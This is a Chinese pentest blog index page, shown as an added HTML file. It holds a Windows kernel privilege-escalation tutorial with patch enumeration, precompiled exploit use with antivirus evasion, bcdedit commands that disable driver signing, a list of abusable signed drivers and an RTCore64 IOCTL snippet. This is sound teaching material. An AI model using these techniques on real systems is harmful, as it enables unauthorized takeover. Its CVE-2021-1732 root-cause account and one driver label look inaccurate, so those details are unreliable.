@@ -1,0 +1,2091 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+<meta property="og:type" content="website">
+<meta property="og:title" content="渗透测试实战记录">
+<meta property="og:url" content="https://congliang.github.io/page/10/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="渗透测试,靶机,Writeup,安全笔记,SRC,提权">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/page/10/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/10/index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">渗透测试实战记录</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-methodology/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/Windows-privesc-methodology/" class="post-title-link" itemprop="url">Windows 提权方法论与工具链</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-15 08:00:00" itemprop="dateCreated datePublished" datetime="2025-02-15T08:00:00+08:00">2025-02-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>系统化 Windows 权限提升方法论。从初始信息枚举到自动化工具链（WinPEAS / PowerUp / Watson），覆盖手动分析与自动扫描的协同策略、常见提权路径决策树，以及完整 Checklist 清单。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Windows-privesc-methodology/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Intranet-information-gathering/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/Intranet-information-gathering/" class="post-title-link" itemprop="url">内网信息收集方法论</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-05 08:00:00" itemprop="dateCreated datePublished" datetime="2025-02-05T08:00:00+08:00">2025-02-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>系统化梳理内网渗透信息收集技术，涵盖网络配置、域环境、WMI/PowerShell脚本与BloodHound数据采集，附完整检查清单与流程图。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Intranet-information-gathering/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-kernel-driver/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/Windows-privesc-kernel-driver/" class="post-title-link" itemprop="url">Windows提权：内核与驱动漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-02-01T08:00:00+08:00">2025-02-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Windows内核提权是渗透测试与红队行动中的关键环节。从获得一个低权限Shell到拿下SYSTEM，中间的桥梁往往是内核或驱动层面的漏洞。本文将系统性地梳理Windows内核提权的实战方法，涵盖信息收集、补丁对比、预编译Exploit使用、驱动签名强制（DSE）绕过，以及三个影响深远的CVE案例分析。</p>
+<hr>
+<h2 id="一、权限基础：Windows安全模型速览"><a href="#一、权限基础：Windows安全模型速览" class="headerlink" title="一、权限基础：Windows安全模型速览"></a>一、权限基础：Windows安全模型速览</h2><p>Windows的访问控制基于以下几个核心概念：</p>
+<table>
+<thead>
+<tr>
+<th>概念</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Access Token</strong></td>
+<td>每个进程拥有一个访问令牌，记录其所属用户、组、特权列表</td>
+</tr>
+<tr>
+<td><strong>Integrity Level</strong></td>
+<td>从Untrusted到System共6个级别，限制跨级别交互</td>
+</tr>
+<tr>
+<td><strong>UAC</strong></td>
+<td>用户账户控制，管理员默认以<code>Medium IL</code>运行，提权需提升至<code>High IL</code></td>
+</tr>
+<tr>
+<td><strong>Session 0 Isolation</strong></td>
+<td>服务运行在Session 0，用户登录在Session 1+，隔离机制防止Shatter攻击</td>
+</tr>
+<tr>
+<td><strong>SYSTEM (NT AUTHORITY\SYSTEM)</strong></td>
+<td>最高权限账户，比Administrator拥有更多特权</td>
+</tr>
+</tbody></table>
+<p>渗透攻击的核心目标通常是从<code>Medium IL</code>提升至<code>High IL</code>（管理员）或直接获取<code>NT AUTHORITY\SYSTEM</code>权限。</p>
+<hr>
+<h2 id="二、信息收集：systeminfo与补丁对比"><a href="#二、信息收集：systeminfo与补丁对比" class="headerlink" title="二、信息收集：systeminfo与补丁对比"></a>二、信息收集：systeminfo与补丁对比</h2><h3 id="2-1-获取系统基础信息"><a href="#2-1-获取系统基础信息" class="headerlink" title="2.1 获取系统基础信息"></a>2.1 获取系统基础信息</h3><p>拿到低权限Shell后，首先收集系统版本与补丁情况：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span> /C:<span class="string">&quot;System Type&quot;</span> /C:<span class="string">&quot;Hotfix&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hotfix(s):                 7 Hotfix(s) Installed.</span><br><span class="line">[01]: KB5012170</span><br><span class="line">[02]: KB5014032</span><br><span class="line">[03]: KB5014671</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-利用PowerShell进行补丁枚举"><a href="#2-2-利用PowerShell进行补丁枚举" class="headerlink" title="2.2 利用PowerShell进行补丁枚举"></a>2.2 利用PowerShell进行补丁枚举</h3><p><code>Get-Hotfix</code> 获取已安装补丁列表，可配合已知漏洞进行比对：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-HotFix</span> | <span class="built_in">Format-Table</span> <span class="literal">-AutoSize</span></span><br><span class="line"><span class="comment"># 只显示安全更新类别的补丁 ID</span></span><br><span class="line"><span class="built_in">Get-HotFix</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.HotFixID <span class="operator">-match</span> <span class="string">&quot;^KB&quot;</span> &#125; | <span class="built_in">Select-Object</span> HotFixID, InstalledOn</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-缺失补丁与漏洞枚举工具"><a href="#2-3-缺失补丁与漏洞枚举工具" class="headerlink" title="2.3 缺失补丁与漏洞枚举工具"></a>2.3 缺失补丁与漏洞枚举工具</h3><p>常用工具包括：</p>
+<ul>
+<li><strong>Watson</strong> (GitHub: rasta-mouse&#x2F;Watson) — 基于C#的缺失补丁枚举，将KB与CVE映射</li>
+<li><strong>Sherlock</strong> (GitHub: rastamouse&#x2F;Sherlock) — PowerShell版漏洞扫描</li>
+<li><strong>WES-NG</strong> (Windows Exploit Suggester - Next Generation) — 将<code>systeminfo</code>输出与漏洞数据库交叉比对</li>
+</ul>
+<p><strong>WES-NG 使用示例：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在靶机上导出 systeminfo</span></span><br><span class="line">systeminfo &gt; C:\temp\sysinfo.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在攻击机上运行（需提前更新数据库）</span></span><br><span class="line">python wes.py sysinfo.txt -i <span class="string">&quot;Elevation of Privilege&quot;</span> --exploits-only</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅显示有公开Exploit可利用的漏洞</span></span><br><span class="line">python wes.py sysinfo.txt --exploits-only</span><br></pre></td></tr></table></figure>
+
+<p><strong>Watson 使用示例：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接在目标机器上运行（需 .NET 4.0+）</span></span><br><span class="line">.\Watson.exe</span><br></pre></td></tr></table></figure>
+
+<p>输出会列出可能受影响的CVE编号、对应的KB，以及是否存在公开Exploit。</p>
+<h3 id="2-4-手动对比技巧"><a href="#2-4-手动对比技巧" class="headerlink" title="2.4 手动对比技巧"></a>2.4 手动对比技巧</h3><p>当无法上传工具时，可手动通过KB查询。微软安全更新指南（MSRC）提供CVE与KB的对应关系：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查询本地已安装的补丁</span><br><span class="line">wmic qfe get HotfixID | findstr KB</span><br><span class="line"></span><br><span class="line"># 结合已知漏洞列表手动排查</span><br><span class="line"># 例：KB5005565 对应 CVE-2021-36934 (HiveNightmare)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、预编译内核Exploit的使用"><a href="#三、预编译内核Exploit的使用" class="headerlink" title="三、预编译内核Exploit的使用"></a>三、预编译内核Exploit的使用</h2><h3 id="3-1-Exploit-获取渠道"><a href="#3-1-Exploit-获取渠道" class="headerlink" title="3.1 Exploit 获取渠道"></a>3.1 Exploit 获取渠道</h3><ul>
+<li><strong>GitHub 仓库</strong>：SecWiki&#x2F;windows-kernel-exploits 收集了大量预编译的二进制</li>
+<li><strong>Exploit-DB</strong>：搜索 “Windows local privilege escalation”</li>
+<li><strong>Packet Storm</strong>：搜索目标版本号</li>
+</ul>
+<h3 id="3-2-使用流程"><a href="#3-2-使用流程" class="headerlink" title="3.2 使用流程"></a>3.2 使用流程</h3><p>以经典的MS16-032 (Secondary Logon Handle) 为例：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在64位 Windows 7 / Server 2008 R2 上</span></span><br><span class="line">.\MS16<span class="literal">-032</span>.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部分 Exploit 支持指定启动的程序</span></span><br><span class="line">.\MS16<span class="literal">-032</span>.exe cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>实战注意事项（踩坑清单）：</strong></p>
+<ol>
+<li><strong>架构匹配</strong>：64位系统必须用64位Exploit，32位Exploit在64位系统上操作64位进程会失败</li>
+<li><strong>目标进程选择</strong>：部分Exploit需要指定目标进程PID，如MS16-032需要找到指定条件的进程</li>
+<li><strong>Exploit稳定性</strong>：内核漏洞触发后可能导致蓝屏（BSOD），首次运行应备份当前工作</li>
+<li><strong>杀软对抗</strong>：预编译的公开Exploit几乎必定被杀软标记，需做免杀处理（混淆、加壳、或自行编译修改）</li>
+<li><strong>版本精确性</strong>：即使同为Windows 10，Build号不同（如19041 vs 19044）可能导致Exploit失效</li>
+</ol>
+<h3 id="3-3-编译自己的Exploit"><a href="#3-3-编译自己的Exploit" class="headerlink" title="3.3 编译自己的Exploit"></a>3.3 编译自己的Exploit</h3><p>当需要绕过签名检测或修改Exploit行为时，通常需要自行编译：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Visual Studio 的 MSBuild</span></span><br><span class="line">MSBuild.exe .\exploit.sln /p:Configuration=Release /p:Platform=x64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或在攻击机上交叉编译后上传</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、驱动签名强制（DSE）绕过"><a href="#四、驱动签名强制（DSE）绕过" class="headerlink" title="四、驱动签名强制（DSE）绕过"></a>四、驱动签名强制（DSE）绕过</h2><h3 id="4-1-DSE-工作原理"><a href="#4-1-DSE-工作原理" class="headerlink" title="4.1 DSE 工作原理"></a>4.1 DSE 工作原理</h3><p>从64位Windows Vista开始，微软要求所有内核模式驱动必须经过数字签名。DSE（Driver Signature Enforcement）阻止加载未经签名的<code>.sys</code>文件。</p>
+<p>检测签名状态：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="class"><span class="keyword">enum</span> | <span class="title">findstr</span> <span class="title">testsigning</span></span></span><br><span class="line"><span class="class"><span class="title">bcdedit</span> /<span class="title">enum</span> | <span class="title">findstr</span> <span class="title">nointegritychecks</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-绕过方法"><a href="#4-2-绕过方法" class="headerlink" title="4.2 绕过方法"></a>4.2 绕过方法</h3><p><strong>方法一：启用 Test Signing Mode（需管理员+重启）</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> testsigning on</span><br><span class="line">bcdedit /<span class="built_in">set</span> nointegritychecks on</span><br><span class="line">shutdown /r /t <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>限制：需要管理员权限，需要重启，桌面右下角会出现”Test Mode”水印。</p>
+<p><strong>方法二：利用 TDL4 &#x2F; Uroburos 等 Bootkit</strong></p>
+<p>通过篡改内核中的<code>g_CiOptions</code>（Code Integrity 全局变量）来关闭签名校验：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 内核中 CI.dll 维护的全局标志</span></span><br><span class="line">ULONG g_CiOptions;  <span class="comment">// 值为 0 表示禁用 DSE</span></span><br></pre></td></tr></table></figure>
+
+<p>公开工具如 <strong>DSEFix</strong> 利用已知的内核驱动漏洞（如WinRing0、Capcom驱动）来写入<code>g_CiOptions</code>。</p>
+<p><strong>方法三：利用存在签名的漏洞驱动</strong></p>
+<p>这是一种更隐蔽的方式——加载一个拥有合法签名但存在漏洞的驱动，再通过该驱动的漏洞执行任意内核代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">已知可利用的签名驱动：</span><br><span class="line">- Capcom.sys    — 任意物理内存读写</span><br><span class="line">- WinRing0.sys  — I/O 端口访问</span><br><span class="line">- RTCore64.sys  — MSI Afterburner 驱动，任意MSR读写</span><br><span class="line">- GVCIDrv64.sys — Gigabyte 驱动</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用 RTCore64.sys 关闭 DSE（示例代码思路）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 加载 RTCore64.sys（它有合法签名，DSE不会拦截）</span><br><span class="line">2. 通过 DeviceIoControl 调用驱动的漏洞功能</span><br><span class="line">3. 该驱动允许读写任意MSR（Model Specific Register）</span><br><span class="line">4. 通过 MSR 修改内核标志位以禁用 SMEP/SMAP</span><br><span class="line">5. 或者通过驱动的物理内存读写能力修改 g_CiOptions</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法四：利用 CVE-2019-16098 (Rtkio64.sys)</strong></p>
+<p>Micro-Star MSI Afterburner的驱动<code>RTCore64.sys</code>开放了任意物理内存读写的IOCTL接口：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IOCTL 0x80002008 — 写入指定物理地址</span></span><br><span class="line"><span class="comment">// IOCTL 0x80002000 — 读取指定物理地址</span></span><br><span class="line">HANDLE hDevice = CreateFileA(<span class="string">&quot;\\\\.\\RTCore64&quot;</span>, ...);</span><br><span class="line">DWORD bytesReturned;</span><br><span class="line">DeviceIoControl(hDevice, <span class="number">0x80002008</span>, &amp;input, <span class="keyword">sizeof</span>(input), <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bytesReturned, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+
+<p>通过该能力可定位并修改内核中的<code>g_CiOptions</code>，进而加载未签名驱动。</p>
+<hr>
+<h2 id="五、CVE-2021-1732：win32k-窗口内核提权"><a href="#五、CVE-2021-1732：win32k-窗口内核提权" class="headerlink" title="五、CVE-2021-1732：win32k 窗口内核提权"></a>五、CVE-2021-1732：win32k 窗口内核提权</h2><h3 id="5-1-漏洞概述"><a href="#5-1-漏洞概述" class="headerlink" title="5.1 漏洞概述"></a>5.1 漏洞概述</h3><ul>
+<li><strong>影响范围</strong>：Windows 10 (1809&#x2F;1909&#x2F;2004&#x2F;20H2)、Windows Server 2019&#x2F;20H2</li>
+<li><strong>漏洞类型</strong>：win32kfull.sys 中存在窗口对象（tagWND）的 Use-After-Free</li>
+<li><strong>后果</strong>：本地提权至SYSTEM</li>
+<li><strong>利用复杂度</strong>：中等，公开PoC存在</li>
+</ul>
+<h3 id="5-2-漏洞根因"><a href="#5-2-漏洞根因" class="headerlink" title="5.2 漏洞根因"></a>5.2 漏洞根因</h3><p><code>win32kfull.sys</code> 中的 <code>xxxCreateWindowEx</code> 在创建滚动条（ScrollBar）窗口时，回调 <code>xxxClientToScreen</code> 会发送 <code>WM_NCCALCSIZE</code> 消息到用户态钩子函数。用户态可在钩子中调用 <code>DestroyWindow</code> 释放窗口对象，导致返回内核后继续操作已释放的内存（UAF）。</p>
